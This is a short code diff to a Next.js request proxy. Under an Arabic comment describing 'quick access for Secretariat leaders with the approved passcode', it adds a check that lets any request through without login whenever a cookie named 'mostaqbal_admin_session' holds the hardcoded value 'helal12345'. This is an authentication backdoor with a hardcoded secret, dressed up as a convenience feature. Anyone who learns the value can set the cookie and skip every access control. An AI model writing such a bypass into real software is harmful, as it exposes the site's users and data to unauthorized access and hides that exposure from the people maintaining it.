@@ -21,6 +21,12 @@ export async function proxy(request: NextRequest) {
   loginUrl.pathname = '/login';
   loginUrl.search = `?next=${encodeURIComponent(`${pathname}${search}`)}`;
 
+  // الدخول السريع لقيادات الأمانة برمز المرور المعتمد
+  const adminSession = request.cookies.get('mostaqbal_admin_session')?.value;
+  if (adminSession === 'helal12345') {
+    return NextResponse.next({ request });
+  }
+
   if (!isConfigured) {
     return NextResponse.redirect(loginUrl);
   }
